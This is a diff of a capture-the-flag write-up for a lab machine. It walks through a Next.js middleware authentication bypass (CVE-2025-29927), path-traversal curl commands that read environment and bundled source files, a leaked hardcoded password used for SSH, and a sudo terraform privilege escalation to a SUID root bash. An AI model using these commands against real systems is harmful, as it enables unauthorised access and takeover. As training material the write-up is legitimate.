@@ -24,14 +24,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ### Port 80
-![[Pasted image 20251212125546.png]]
+![Pasted image 20251212125546](../Attachments/Pasted%20image%2020251212125546.png)
 
 ### Login 
 - If you click get started or docs you will be redirected to a login page. The url is interesting as it has `api/auth` in it
-![[Pasted image 20251212125646.png]]
+![Pasted image 20251212125646](../Attachments/Pasted%20image%2020251212125646.png)
 
 - Wappalyzer shows a lot of next.js is being used version 15.2.2
-![[Pasted image 20251212125940.png]]
+![Pasted image 20251212125940](../Attachments/Pasted%20image%2020251212125940.png)
 
 - Looking online i find there is an authorization bypass for this version based on CVE-2025-29927 
 - Basically we can bypass authentication with this header : `X-Middleware-Subrequestmiddleware:middleware:middleware:middleware:middleware`
@@ -43,7 +43,7 @@ dirsearch -u http://previous.htb/api -H 'x-middleware-subrequest: middleware:mid
 ---RELEVANT-OUTPUT---
 [13:17:56] 400 -   28B  - /api/download
 ```
-![[Pasted image 20251212132813.png]]
+![Pasted image 20251212132813](../Attachments/Pasted%20image%2020251212132813.png)
 
 - I then parameter blast this endpoint with ffuf:
 ```
@@ -115,7 +115,7 @@ curl 'http://previous.htb/api/download?example=/../../../proc/self/environ' -H '
 ---OUTPUT---
 NODE_VERSION=18.20.8HOSTNAME=0.0.0.0YARN_VERSION=1.22.22SHLVL=1PORT=3000HOME=/home/nextjsPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNEXT_TELEMETRY_DISABLED=1PWD=/appNODE_ENV=production
 ```
-![[Pasted image 20251212184646.png]]
+![Pasted image 20251212184646](../Attachments/Pasted%20image%2020251212184646.png)
 - The working directory is `/app`
 - Need to understand how next.js applications run:
 ```
@@ -144,9 +144,9 @@ drwxrwxr-x   2 kali kali   4096 Dec 12 17:29 public
 -rw-rw-r--   1 kali kali   1450 Dec 12 17:29 README.md
 -rw-rw-r--   1 kali kali    666 Dec 12 17:29 tsconfig.json
 ```
-![[Pasted image 20251212185225.png]]
+![Pasted image 20251212185225](../Attachments/Pasted%20image%2020251212185225.png)
 - Looking at the tree structure at `.next` I find an interesting file:`routes-manifest.json`
-![[Pasted image 20251212185323.png]]
+![Pasted image 20251212185323](../Attachments/Pasted%20image%2020251212185323.png)
 - I try to see if that exists in the app:
 ```
 curl 'http://previous.htb/api/download?example=/../../../app/.next/routes-manifest.json' -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
@@ -257,15 +257,15 @@ curl 'http://previous.htb/api/download?example=/../../../../app/.next/server/pag
 curl 'http://previous.htb/api/download?example=../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
 "use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();
 ```
-![[Pasted image 20251212190210.png]]
+![Pasted image 20251212190210](../Attachments/Pasted%20image%2020251212190210.png)
 - We get credentials `jeremy:JeremyAndILovePancakes`
 - But this account wasn't there in passwd file. We anyway try to ssh into target with these credentials and it works. Maybe the app was running on a container (we cna confirm this looking around at target)
 ```
 ssh jeremy@previous.htb
 ```
-![[Pasted image 20251212190344.png]]
+![Pasted image 20251212190344](../Attachments/Pasted%20image%2020251212190344.png)
 - I grab user flag:
-![[Pasted image 20251212190450.png]]
+![Pasted image 20251212190450](../Attachments/Pasted%20image%2020251212190450.png)
 - Checking sudo privileges we see we can pass a terraform command:
 ```
 sudo -l
@@ -280,10 +280,10 @@ User jeremy may run the following commands on previous:
     (root) /usr/bin/terraform -chdir\=/opt/examples apply
 ```
 
-![[Pasted image 20251212190532.png]]
+![Pasted image 20251212190532](../Attachments/Pasted%20image%2020251212190532.png)
 
 - Going to `/opt/examples` I read the main.tf file:
-![[Pasted image 20251212190722.png]]
+![Pasted image 20251212190722](../Attachments/Pasted%20image%2020251212190722.png)
 - Based on the sudo command we can see that the environment variables are reset and the paths are deleted. So we can basically change the PATH to our exploit instead of this main.tf default path and root would then run our exploit.
 - Looking online for a privilege escalation via terraform I find this: https://toshith29.medium.com/proof-of-concept-terraform-privilege-escalation-cd3db69df90e (im hoping its not based on this box itself..)
 - I need to compile the exploit via go locally:
@@ -373,7 +373,7 @@ sudo /usr/bin/terraform -chdir\=/opt/examples apply
 │   ELF architecture: EM_X86_64 (current architecture: amd64)
 │ ..
 ```
-![[Pasted image 20251212192402.png]]
+![Pasted image 20251212192402](../Attachments/Pasted%20image%2020251212192402.png)
 - I then check bash privileges:
 ```
 ls -al /bin/bash
@@ -381,13 +381,13 @@ ls -al /bin/bash
 ---OUTPUT---
 -rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
 ```
-![[Pasted image 20251212192449.png]]
+![Pasted image 20251212192449](../Attachments/Pasted%20image%2020251212192449.png)
 - I can gain root shell by passing the bash command with the `-p` argument to preserve privielges:
 ```
 bash -p
 ```
-![[Pasted image 20251212192533.png]]
+![Pasted image 20251212192533](../Attachments/Pasted%20image%2020251212192533.png)
 
 - I grab the root flag:
-![[Pasted image 20251212192656.png]]
+![Pasted image 20251212192656](../Attachments/Pasted%20image%2020251212192656.png)
 
